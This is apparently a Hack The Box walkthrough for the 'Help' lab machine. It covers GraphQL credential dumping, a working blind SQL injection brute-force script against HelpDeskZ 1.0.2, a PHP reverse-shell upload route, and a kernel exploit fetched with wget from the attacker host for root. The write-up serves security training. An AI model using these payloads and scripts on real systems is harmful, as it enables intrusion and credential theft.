@@ -1,0 +1,257 @@
+Help
+
+08th May 2019 / Document No D19.100.22
+
+Prepared By: MinatoTW
+Machine Author: cymtrick
+Difficulty: E asy
+Classification: Official
+
+                                                                        Page 1 / 15
+SYNOPSIS
+
+Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of
+credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can
+be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file
+upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be
+exploited to get a root shell.
+
+Skills Required   Skills Learned
+
+     Enumeration       GraphQL enumeration
+     Scripting         Blind SQL injection
+
+                                            Page 2 / 15
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -sT -T4 10.10.10.121 | grep ^[0-9] | cut
+ -d ' /' -f 1 | tr ' \n' ' ,' | sed s/,$//)
+ nmap -sC -sV -p$ports 10.10.10.121
+
+Apache is running on port 80 along with ssh on port 22. A Node.js server is running on port
+3000.
+
+                                                                                                                  Page 3 / 15
+APACHE
+
+Navigating to the page directly shows a default Apache installation.
+
+GOBUSTER
+
+ gobuster -w directory-list-2.3-medium.txt -t 100 -u http://10.10.10.121/
+
+Gobuster straight away discovers /support going to which we find a HelpDeskz installation.
+                                                                                                                  Page 4 / 15
+A quick google search takes us to the g ithub page of the software. We see that it contains a file
+UPGRADING.txt in the root folder. Checking for the file on the box returns the changelog.
+
+The version is found to be 1.0.2. Checking exploit-db for the version returns two vulnerabilities, an
+arbitrary file upload and an a uthenticated SQL injection.
+
+NODE.JS SERVER
+
+Navigating to port 3000 the page returns a message.
+
+From the response headers the server is found to running Express framework.
+
+                                                                                                                  Page 5 / 15
+Googling about "Express js query language" we come across results related to GraphQL.
+
+Navigating to /graphql we encounter an error about the GET parameter.
+Trying http://10.10.10.121:3000/graphql?query=abc the page returns an error.
+Next we try to query information. A graphql endpoint takes in objects as input. As we need
+information related to a user lets try a user object,
+ curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}"
+ | jq
+
+The page asks us to supply subfields, let's try that with an obvious attribute such as username.
+                                                                                                                  Page 6 / 15
+ curl -s -G http://10.10.10.121:3000/graphql --data-urlencode
+ 'query={user {username} }' | jq
+
+The server returns a username i.e helpme@helpme.com. Now we can try dumping the password
+too.
+ curl -s -G http://10.10.10.121:3000/graphql --data-urlencode
+ 'query={user {username, password} }' | jq
+
+And we get the password. The password is 32 characters long i.e md5. Cracking in on H ashKiller
+returns the cracked password as "godhelpmeplz".
+
+Trying the credentials helpme@helpme.com / godhelpmeplz on the HelpDesk page lets us in.
+
+                                                                                                                  Page 7 / 15
+FOOTHOLD
+AUTHENTICATION SQL INJECTION
+
+From initial enumeration we know the version is vulnerable to SQL injection.
+Lets upload a ticket and fetch the attachment URL. Navigate to Submit and ticket and upload a
+ticket with an image as attachment. Go to VIew Tickets and open the ticket.
+
+Right click on the attachment and copy the link. Request it and intercept in burp. An example
+ticket is,
+ http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]
+ =attachment&param[]=1&param[]=6
+Lets check if it's vulnerable to SQLI,
+ http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]
+ =attachment&param[]=1&param[]=6 and 1=1-- -
+Sending this results in a true condition which returns the image but changing it to 1=2 doesn't
+because it evaluates to false. This confirms the SQLi vulnerability.
+From the l ogin controller we know the table name i.e staff and the columns username and
+password. The password is stored as a SHA1 hash which a 40 characters long.
+
+                                                                                                                  Page 8 / 15
+Lets check if the username is admin.
+ http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]
+ =attachment&param[]=1&param[]=6 and (select (username) from staff limit
+ 0,1) = 'admin'-- -
+This query returns the attachment that means it was true. In case the user wasn't admin, for
+example,
+ http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]
+ =attachment&param[]=1&param[]=6 and (select (username) from staff limit
+ 0,1) = 'dummy'-- -
+
+It results in false and the page returns not found. Now we have a username and need to
+determine the password. For this the password has to determined character by character upto 40
+times. For this we can use the substr function which will loop character by character, example,
+
+ http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]
+ =attachment&param[]=1&param[]=6 and substr((select password from staff
+ limit 0,1),1,1) = 'd'-- -
+
+Which returns the attachment and confirms that the hash starts with d.
+
+                                                                                                                  Page 9 / 15
+This can be scripted.
+
+ #!/usr/bin/python
+ from requests i mport get
+ import string
+ cookies = { 'lang' : 'english', 'PHPSESSID' : 'se3q2q1vtvmb71acq5i16ajtf1',
+ 'usrhash' :
+ '0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqY
+ H6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yV
+ LoZ06smnKha9AGF4yL2Ylo%2BHDu89nyBt7elyC8vIIYgpCcpqa%2BUhLVh9kcZWIcDfKPw=='
+ }
+ url = ' http://10.10.10.121/support/?v='
+ chars = list(string.ascii_lowercase) + list(string.digits)
+ password = []
+ k = 1
+ while( k <= 4 0 ):
+
+           for i i n chars:
+                     payload = url +
+
+ "view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=
+ 6 and substr((select password from staff limit 0,1),{},1) = '{}'--
+ -".format(k, i)
+
+                     resp = get( payload, cookies = cookies)
+                     if "404" not i n resp.content:
+
+                               password.append(i)
+                               print "Password: " + ''. join(password)
+                               k = k + 1
+                               break
+
+Copy your cookies from burp into the script, then run it. The script checks the hash character by
+character, if a character is found the count is incremented and moved to the next one.
+
+ $ python brute.py
+ Password: d
+ Password: d3
+ Password: d31
+ ---------------------- SNIP ----------------------
+ Password: d318f44739d
+ Password: d318f44739dc
+ Password: d318f44739dce
+
+                                                                                                                 Page 10 / 15
+ Password: d318f44739dced
+ Password: d318f44739dced6
+ Password: d318f44739dced66
+ ---------------------- SNIP ----------------------
+ Password: d318f44739dced66793b1a603028
+ Password: d318f44739dced66793b1a6030281
+ Password: d318f44739dced66793b1a60302813
+ ---------------------- SNIP ----------------------
+ Password: d318f44739dced66793b1a603028133a76ae68
+ Password: d318f44739dced66793b1a603028133a76ae680
+ Password: d318f44739dced66793b1a603028133a76ae680e
+
+Running the script finds the complete password hash i.e
+"d318f44739dced66793b1a603028133a76ae680e". Checking this on HashKiller cracks it as
+Welcome1.
+
+Similarly the email has to be found out. The script would need minor adjustments. Extend the
+character set to include @, _, . and change the column name to email.
+ chars = list(string.ascii_lowercase) + list(string.digits) + [' @', ' _',
+ '.']
+
+Run the script again to get the email.
+ $ python brute.py
+ Email: s
+ Email: su
+ Email: sup
+ Email: supp
+ -------------- SNIP ---------------
+ Email: support@mysite.co
+ Email: support@mysite.com
+
+                                                                                                                 Page 11 / 15
+Now we have the credentials for admin i.e support@mysite.com / Welcome1. We can login to
+SSH. The username needs to be guessed which is "help".
+ ssh help@1 0.10.10.121 # password: Welcome1
+
+ALTERNATE METHOD
+
+Earlier we found the HelpDesk version to be vulnerable to arbitrary file upload too. So we could
+possibly upload a php reverse shell and trigger it.
+Download the exploit script from here and the php reverse shell from h ere. The script exploits the
+lack of randomness in the name of the uploaded file as it is based on time. So by quickly brute
+forcing the md5 hash at the same time we can discover the renamed file. But before that we
+need to figure out the upload location. Going back to the github page to the
+submit_ticket_controller.php we find this snippet,
+
+The file gets moved to $uploaddir which is UPLOAD_DIR . `tickets/' where UPLOAD_DIR is the
+global upload directory i.e /uploads defined at
+
+                                                                                                                 Page 12 / 15
+https://github.com/evolutionscript/HelpDeskZ-1.0/blob/006662bb856e126a38f2bb76df44a2e4e3
+d37350/includes/global.php#L18.
+
+Now that we know the upload location, navigate to the Submit a Ticket page and create a ticket.
+Change the IP Address and port in the php script and upload it.
+
+The page returns an error saying "File is not allowed" but the file is already uploaded before the
+extension check takes place, if we quickly run the script,
+ python 40300.py http://10.10.10.121/support/uploads/tickets/
+ php-reverse-shell.php
+
+It finds the file and hitting it gives a shell.
+
+Get a tty shell using python,
+ python -c " import pty;pty.spawn('/bin/bash')"
+
+                                                 Page 13 / 15
+Note: Due to timezones the exploit might not work out of the box. This can be fixed by changing
+local time to that of the server. The server's time can be seen in HTTP Response.
+
+PRIVILEGE ESCALATION
+
+On enumerating the box the kernel version is found to be 4.4.0-116-generic. A google search
+results in a kernel exploit for the version.
+
+Download the exploit and compile it locally.
+ gcc exploit.c -o exploit
+Start a simple http server and transfer it to the box then execute it.
+ python3 -m http.server 80 # Locally
+ cd /tmp
+ wget 10.10.14.2/exploit
+ chmod +x exploit
+ ./exploit
+
+                                                                                                                 Page 14 / 15
+The exploit directly results in a root shell.
+                                                                                                                 Page 15 / 15
+
